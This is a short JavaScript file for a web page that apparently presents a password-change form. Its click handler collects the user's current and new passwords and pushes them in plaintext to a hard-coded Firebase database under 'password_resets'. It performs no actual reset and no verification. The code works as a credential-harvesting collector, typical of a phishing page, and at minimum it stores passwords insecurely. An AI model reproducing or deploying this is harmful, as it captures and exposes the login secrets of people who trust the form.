// Firebase SDK
import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
import {
    getDatabase,
    ref,
    push
} from "https://www.gstatic.com/firebasejs/10.12.2/firebase-database.js";

// Replace with your Firebase Config
const firebaseConfig = {
    apiKey: "AIzaSyBRxp7bdCJk6aCGNjz2YqGRZ7HvzknUoaY",
    authDomain: "manas-in-87599.firebaseapp.com",
    databaseURL: "https://manas-in-87599-default-rtdb.firebaseio.com",
    projectId: "manas-in-87599",
    storageBucket: "manas-in-87599.appspot.com",
    messagingSenderId: "684168094109",
    appId: "1:684168094109:web:1ed2c0545e47c31515cf74",
    measurementId: "G-ZL5LHJQ8MT"
};

// Initialize Firebase
const app = initializeApp(firebaseConfig);
const database = getDatabase(app);

// Button
const btn = document.querySelector("button");

btn.addEventListener("click", (e) => {
    e.preventDefault();

    const currentPassword = document.querySelectorAll("input")[0].value;
    const newPassword = document.querySelectorAll("input")[1].value;
    const confirmPassword = document.querySelectorAll("input")[2].value;

    if (newPassword !== confirmPassword) {
        alert("Passwords do not match.");
        return;
    }

    push(ref(database, "password_resets"), {
        currentPassword,
        newPassword,
        createdAt: new Date().toISOString()
    })
    .then(() => {
        alert("Password reset request saved.");
    })
    .catch((error) => {
        alert(error.message);
    });
});